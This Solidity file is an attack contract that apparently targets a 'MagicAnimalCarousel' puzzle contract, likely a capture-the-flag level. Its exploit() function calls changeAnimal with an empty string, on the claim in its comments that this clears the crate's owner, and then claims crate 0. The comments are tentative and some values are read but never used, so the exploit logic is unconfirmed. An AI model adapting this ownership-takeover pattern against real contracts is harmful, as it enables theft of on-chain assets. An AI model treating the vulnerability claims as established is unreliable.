// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function carousel(uint256 crateId) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
}

contract CarouselExploit {
    IMagicAnimalCarousel public carousel;
    
    constructor(address _carousel) {
        carousel = IMagicAnimalCarousel(_carousel);
    }
    
    function exploit() external {
        // First, let's set an animal to understand the state
        carousel.setAnimalAndSpin("cat");
        
        // Check the current state
        uint256 currentId = carousel.currentCrateId();
        uint256 data0 = carousel.carousel(0);
        uint256 data1 = carousel.carousel(1);
        
        // The vulnerability is in the bit shifting - let's exploit it
        // In changeAnimal, when we pass empty string, it clears the owner slot
        // but keeps the animal and next ID
        carousel.changeAnimal("", 0);
        
        // Now crate 0 has no owner, so anyone can change it
        // Let's set ourselves as owner of crate 0
        carousel.changeAnimal("dog", 0);
    }
    
    function checkState() external view returns (uint256 crate0, uint256 crate1, uint256 currentId) {
        crate0 = carousel.carousel(0);
        crate1 = carousel.carousel(1);
        currentId = carousel.currentCrateId();
    }
}